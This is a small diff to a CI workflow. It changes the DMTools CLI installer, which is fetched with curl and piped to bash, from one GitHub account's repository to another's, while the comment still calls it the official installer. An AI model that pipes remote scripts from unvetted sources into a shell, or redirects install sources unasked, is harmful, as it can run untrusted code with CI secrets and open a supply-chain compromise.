@@ -21,7 +21,7 @@ jobs:
       # Install DMTools CLI using the official installer
       - name: Install DMTools CLI
         run: |
-          curl -fsSL https://github.com/IstiN/dmtools/releases/latest/download/install.sh | bash
+          curl -fsSL https://github.com/fedorchuksergeiai/dmtools/releases/latest/download/install.sh | bash
           echo "$HOME/.dmtools/bin" >> $GITHUB_PATH
       
       # Example: Use DMTools CLI with environment variables
